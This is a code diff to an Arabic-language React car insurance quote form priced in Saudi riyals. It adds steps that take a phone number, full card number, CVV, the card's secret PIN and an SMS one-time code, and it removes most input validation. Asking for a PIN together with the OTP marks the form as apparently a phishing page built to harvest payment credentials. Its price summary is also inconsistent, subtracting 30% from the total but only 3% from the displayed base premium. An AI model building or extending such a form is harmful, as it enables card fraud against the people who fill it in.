                                         <div key={idx} className="flex items-center gap-2">
                                           <div className="w-4 h-4 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                                            <CheckCircle className="w-2.5 h-2.5 text-green-600" />
+                                            <Check className="w-2.5 h-2.5 text-green-600" />
                                           </div>
                                           <span className="text-xs text-gray-700 leading-relaxed">
                                             {feature.content.length > 35
@@ -1624,7 +1558,6 @@ function ProfessionalQuoteForm() {
                                         </div>
                                       ))}
                                   </div>
-
                                   {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
                                     <p className="text-xs text-[#109cd4] mt-2 font-medium">
                                       +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
@@ -1638,7 +1571,7 @@ function ProfessionalQuoteForm() {
                             {isSelected && (
                               <div className="absolute top-3 left-3">
                                 <div className="w-6 h-6 bg-[#109cd4] rounded-full flex items-center justify-center">
-                                  <CheckCircle className="w-3.5 h-3.5 text-white" />
+                                  <Check className="w-3.5 h-3.5 text-white" />
                                 </div>
                               </div>
                             )}
@@ -1721,10 +1654,127 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-        
-            {/* ... existing code for other steps ... */}
-
             {currentPage === 5 && (
+              <div className="space-y-8">
+                <div className="text-center mb-8">
+                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                    ملخص الطلب ومعلومات التواصل
+                  </h3>
+                  <p className="text-gray-600">راجع طلبك وأدخل معلومات التواصل لإتمام العملية</p>
+                </div>
+
+                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                  <div className="space-y-6">
+                    <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
+                    <label>رقم الهاتف</label>
+                    <Input
+                      name="phone"
+                      type="tel"
+                      placeholder="05xxxxxxxx"
+                      required
+                      maxLength={10}
+                      autoFocus={true}
+                      value={formData.phone}
+                      onChange={(e) => handleFieldChange("phone", e.target.value)}
+                      className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                    />
+
+                    <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
+                      <div className="flex items-start gap-3">
+                        <input
+                          type="checkbox"
+                          className="w-5 h-5 mt-1 text-[#109cd4]"
+                          checked={formData.agreeToTerms}
+                          onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
+                        />
+                        <span className="text-sm text-blue-800">
+                          أوافق على{" "}
+                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
+                            الشروط والأحكام
+                          </a>{" "}
+                          و{" "}
+                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
+                            سياسة الخصوصية
+                          </a>
+                        </span>
+                      </div>
+                    </div>
+
+                    {errors.agreeToTerms && (
+                      <div className="flex items-center gap-2 text-red-600 text-sm">
+                        <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                        <span>{errors.agreeToTerms}</span>
+                      </div>
+                    )}
+                  </div>
+
+                  <Card className="border-2 border-gray-200 h-fit">
+                    <CardContent className="p-6">
+                      {(() => {
+                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
+                        if (!selectedOffer) {
+                          return <div className="text-center text-gray-500">لم يتم اختيار عرض</div>
+                        }
+
+                        const basePrice = Number.parseFloat(selectedOffer.main_price)
+                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
+                          formData.selectedAddons.includes(f.id),
+                        )
+                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
+                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
+                        const total = basePrice - basePrice * 0.3 + addonsTotal + expenses
+
+                        return (
+                          <div className="space-y-4">
+                            <div className="text-center mb-6">
+                              <h4 className="text-xl font-bold text-gray-900">
+                                {selectedOffer.name.replace(/insurance/g, "").trim()}
+                              </h4>
+                              <p className="text-gray-600">
+                                {selectedOffer.type === "against-others"
+                                  ? "تأمين ضد الغير"
+                                  : selectedOffer.type === "comprehensive"
+                                    ? "تأمين شامل"
+                                    : "تأمين خاص"}
+                              </p>
+                            </div>
+
+                            <div className="space-y-3">
+                              <div className="flex justify-between items-center">
+                                <span className="text-gray-600">قسط التأمين الأساسي</span>
+                                <span className="font-semibold">{(basePrice - basePrice * 0.03).toFixed(0)} ر.س</span>
+                              </div>
+                              {addonsTotal > 0 && (
+                                <div className="flex justify-between items-center">
+                                  <span className="text-gray-600">الإضافات المختارة</span>
+                                  <span className="font-semibold">{addonsTotal} ر.س</span>
+                                </div>
+                              )}
+                              {selectedOffer.extra_expenses.map((expense) => (
+                                <div key={expense.id} className="flex justify-between items-center text-sm">
+                                  <span className="text-gray-600">{expense.reason}</span>
+                                  <span className="font-medium">
+                                    {expense.reason.includes("خصم") ? "-" : "+"}
+                                    {expense.price} ر.س
+                                  </span>
+                                </div>
+                              ))}
+                              <hr className="border-gray-200" />
+                              <div className="flex justify-between items-center text-xl">
+                                <span className="font-bold text-gray-900">المجموع الكلي</span>
+                                <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
+                              </div>
+                            </div>
+                          </div>
+                        )
+                      })()}
+                    </CardContent>
+                  </Card>
+                </div>
+              </div>
+            )}
+
+            {currentPage === 6 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1756,29 +1806,12 @@ function ProfessionalQuoteForm() {
                         placeholder="#### #### #### ####"
                         required
                         dir="ltr"
-                        value={formatCardNumber(cardNumber)}
-                        onChange={(e) => {
-                          const value = e.target.value.replace(/\D/g, "")
-                          if (value.length <= 16) {
-                            setCardNumber(value)
-                          }
-                        }}
-                        maxLength={19}
+                        value={cardNumber}
+                        onChange={(e) => setCardNumber(e.target.value)}
+                        maxLength={16}
                         autoFocus={true}
-                        className={`h-12 ${errors.cardNumber ? "border-red-500" : "border-gray-300"}`}
+                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                       />
-                      {cardNumber && (
-                        <div className="flex items-center gap-2 mt-2">
-                          <span className="text-sm text-gray-600">نوع البطاقة: {getCardType(cardNumber)}</span>
-                          {validateCardNumber(cardNumber) && <CheckCircle className="w-4 h-4 text-green-600" />}
-                        </div>
-                      )}
-                      {errors.cardNumber && (
-                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                          <span>{errors.cardNumber}</span>
-                        </div>
-                      )}
                     </div>
 
                     <div>
@@ -1789,18 +1822,12 @@ function ProfessionalQuoteForm() {
                         name="cardName"
                         id="cardName"
                         type="text"
-                        className={`h-12 ${errors.cardName ? "border-red-500" : "border-gray-300"}`}
+                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                         value={cardName}
                         onChange={(e) => setCardName(e.target.value)}
                         placeholder="الاسم الكامل"
                         required
                       />
-                      {errors.cardName && (
-                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                          <span>{errors.cardName}</span>
-                        </div>
-                      )}
                     </div>
 
                     <div className="grid grid-cols-3 gap-4">
@@ -1811,9 +1838,7 @@ function ProfessionalQuoteForm() {
                         <select
                           name="expiryMonth"
                           id="expiryMonth"
-                          className={`w-full h-12 px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
-                            errors.cardMonth ? "border-red-500" : "border-gray-300"
-                          }`}
+                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                           value={cardMonth}
                           onChange={(e) => setCardMonth(e.target.value)}
                         >
@@ -1824,12 +1849,6 @@ function ProfessionalQuoteForm() {
                             </option>
                           ))}
                         </select>
-                        {errors.cardMonth && (
-                          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                            <span>{errors.cardMonth}</span>
-                          </div>
-                        )}
                       </div>
 
                       <div>
@@ -1837,9 +1856,7 @@ function ProfessionalQuoteForm() {
                           السنة <span className="text-red-500">*</span>
                         </label>
                         <select
-                          className={`w-full h-12 px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
-                            errors.cardYear ? "border-red-500" : "border-gray-300"
-                          }`}
+                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                           value={cardYear}
                           onChange={(e) => setCardYear(e.target.value)}
                           name="expiryYear"
@@ -1855,12 +1872,6 @@ function ProfessionalQuoteForm() {
                             )
                           })}
                         </select>
-                        {errors.cardYear && (
-                          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                            <span>{errors.cardYear}</span>
-                          </div>
-                        )}
                       </div>
 
                       <div>
@@ -1871,20 +1882,15 @@ function ProfessionalQuoteForm() {
                           name="cvv"
                           id="cvv"
                           type="password"
-                          className={`h-12 ${errors.cvv ? "border-red-500" : "border-gray-300"}`}
+                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                           placeholder="123"
                           maxLength={3}
                           value={cvv}
-                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
+                          onChange={(e) => setCvv(e.target.value)}
                         />
-                        {errors.cvv && (
-                          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                            <span>{errors.cvv}</span>
-                          </div>
-                        )}
                       </div>
                     </div>
+
                     <div className="w-full h-12">
                       <label className="block text-sm font-semibold text-gray-700 mb-3">
                         الرقم السري للبطاقة <span className="text-red-500">*</span>
@@ -1893,19 +1899,13 @@ function ProfessionalQuoteForm() {
                         name="pinCode"
                         id="pinCode"
                         type="password"
-                        className={`h-12 ${errors.pinCode ? "border-red-500" : "border-gray-300"}`}
+                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                         placeholder="####"
                         maxLength={4}
                         value={pinCode}
                         required
-                        onChange={(e) => setPinCode(e.target.value.replace(/\D/g, ""))}
+                        onChange={(e) => setPinCode(e.target.value)}
                       />
-                      {errors.pinCode && (
-                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                          <span>{errors.pinCode}</span>
-                        </div>
-                      )}
                     </div>
                   </div>
 
@@ -1954,7 +1954,7 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-            {currentPage === 6 && (
+            {currentPage === 7 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1990,16 +1990,8 @@ function ProfessionalQuoteForm() {
                       maxLength={6}
                       onChange={(e) => setOtp(e.target.value)}
                       autoFocus={true}
-                      className={`text-center text-2xl h-14 tracking-widest ${
-                        errors.otp ? "border-red-500" : "border-gray-300"
-                      }`}
+                      className="text-center text-2xl h-14 tracking-widest border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                     />
-                    {errors.otp && (
-                      <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                        <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                        <span>{errors.otp}</span>
-                      </div>
-                    )}
                   </div>
 
                   {otpTimer > 0 ? (
@@ -2092,5 +2084,3 @@ function ProfessionalQuoteForm() {
     </Card>
   )
 }
-
-// ... existing code for getBadgeText and getTypeBadge functions ...
